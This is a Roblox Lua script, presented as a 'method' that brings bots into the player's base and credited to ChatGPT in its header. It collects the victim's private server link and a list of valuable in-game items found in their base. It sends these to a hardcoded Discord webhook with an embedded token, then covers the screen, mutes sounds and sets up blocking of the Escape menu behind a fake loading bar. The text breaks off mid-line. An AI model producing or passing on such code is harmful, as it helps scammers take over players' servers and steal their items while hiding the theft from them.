-- 📘 MOREIRA METHOD - Unified Script (GUI + Webhook + Loading)
-- By ChatGPT 💙

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")

-- 🔗 Webhook URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1405766174419189842/b8qzM3d6u8a_OFGx5zIUsrSnp7TUkpCUCV4Y6tU_ZkSTMsHzf9XwEoWJzm9AqWbV3o6F"

-- 📦 Lista de objetos a monitorear
local objectNames = {
    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
}

-- ------------------------------------------------------------
-- 🔍 Función para verificar servidor privado y dueño
-- ------------------------------------------------------------
local function IsPlayerInOwnPrivateServer()
    local runService = game:GetService("RunService")
    if runService:IsStudio() then return true end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        if game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0 then
            return LocalPlayer.UserId == game.PrivateServerOwnerId
        else return false end
    end
    if game.VIPServerId and game.VIPServerId ~= "" then return true end
    return false
end

if not IsPlayerInOwnPrivateServer() then
    LocalPlayer:Kick("You must be in your own private server to use this script.")
    return
end

-- ------------------------------------------------------------
-- 🔹 Crear RemoteEvent para enviar webhook si no existe
-- ------------------------------------------------------------
local sendEvent = ReplicatedStorage:FindFirstChild("SendDiscordWebhook")
if not sendEvent then
    sendEvent = Instance.new("RemoteEvent")
    sendEvent.Name = "SendDiscordWebhook"
    sendEvent.Parent = ReplicatedStorage
end

-- ------------------------------------------------------------
-- 🪟 Crear GUI para link del servidor privado
-- ------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraMethodGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
if not screenGui.Parent then screenGui.Parent = playerGui end

local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0, 420, 0, 240)
inputFrame.Position = UDim2.new(0.5, -210, 0.5, -120)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = inputFrame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 60)
label.Position = UDim2.new(0, 20, 0, 25)
label.BackgroundTransparency = 1
label.Text = "PUT YOUR PRIVATE SERVER LINK HERE"
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.Parent = inputFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 45)
textBox.Position = UDim2.new(0.05, 0, 0, 100)
textBox.PlaceholderText = "Enter your private server link..."
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
textBox.BorderSizePixel = 0
textBox.ClearTextOnFocus = false
textBox.Parent = inputFrame

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 8)
tbCorner.Parent = textBox

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.5, 0, 0, 45)
sendButton.Position = UDim2.new(0.25, 0, 0, 160)
sendButton.BackgroundColor3 = Color3.fromRGB(40, 200, 80)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextScaled = true
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Text = "SEND"
sendButton.Parent = inputFrame

local sendCorner = Instance.new("UICorner")
sendCorner.CornerRadius = UDim.new(0, 8)
sendCorner.Parent = sendButton

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, -40, 0, 40)
infoLabel.Position = UDim2.new(0, 20, 0, 210)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
infoLabel.Text = "The better things you have in your base, the better bots will join."
infoLabel.Parent = inputFrame

-- ------------------------------------------------------------
-- 🔹 Funciones de webhook y búsqueda de objetos
-- ------------------------------------------------------------
local function findObjects()
    local found = {}
    for _, name in ipairs(objectNames) do
        local obj = Workspace:FindFirstChild(name, true)
        if obj then table.insert(found, name) end
    end
    return found
end

sendEvent.OnServerEvent:Connect(function(player, privateServerLink)
    local objectsFound = findObjects()
    local message
    if #objectsFound == 0 then
        message = player.Name.." is in server: "..privateServerLink.."\nNo monitored objects were found in the base."
    else
        message = player.Name.." is in server: "..privateServerLink.."\nObjects found: "..table.concat(objectsFound, ", ")
    end
    local data = {["content"] = message}
    local jsonData = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
    end)
    if not success then warn("Error sending to webhook:", err) end
end)

-- ------------------------------------------------------------
-- 🔹 Función para pantalla negra y barra de carga
-- ------------------------------------------------------------
local function muteAllSounds()
    for _, sound in pairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then sound.Volume = 0 end
    end
    for _, sound in pairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then sound.Volume = 0 end
    end
end

local escBlockActionName = "BlockEscMenu"
local function blockEscMenu() return Enum.ContextActionResult.Sink end

-- ------------------------------------------------------------
-- 🔹 Acciones al presionar SEND
-- ------------------------------------------------------------
sendButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255, 100, 100)
        label.Text = "⚠️ Please enter your private server link!"
        return
    end

    inputFrame:Destroy()
    ReplicatedStorage:WaitForChild("SendDiscordWebhook"):FireServer(link)

    -- Pantalla negra
    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1,0,1,0)
    blackFrame.Position = UDim2.new(0,0,0,0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blackFrame.ZIndex = 9999
    blackFrame.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1,0,0,100)
    loadingText.Position = UDim2.new(0,0,0.5,-50)
    loadingText.BackgroundTransparency = 1
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0,180,255)
    loadingText.Text = "LOADING..."
    loadingText.ZIndex = 10000
    loadingText.Parent = blackFrame

    local barWidth, barHeight = 500, 28
    local barFrame = Instance.new("Frame")
    barFrame.Size = UDim2.new(0, barWidth, 0, barHeight)
    barFrame.Position = UDim2.new(0.5, -barWidth/2, 0.5, 70)
    barFrame.BackgroundColor3 = Color3.fromRGB(30,30,60)
    barFrame.BorderSizePixel = 0
    barFrame.ZIndex = 10001
    barFrame.Parent = blackFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0,14)
    barCorner.Parent = barFrame

    local fillFrame = Instance.new("Frame")
    fillFrame.Size = UDim2.new(0,0,1,0)
    fillFrame.BackgroundColor3 = Color3.fromRGB(0,140,255)
    fillFrame.ZIndex = 10002
    fillFrame.BorderSizePixel = 0
    fillFrame.Parent = barFrame

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0,14)
    fillCorner.Parent = fillFrame

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size =
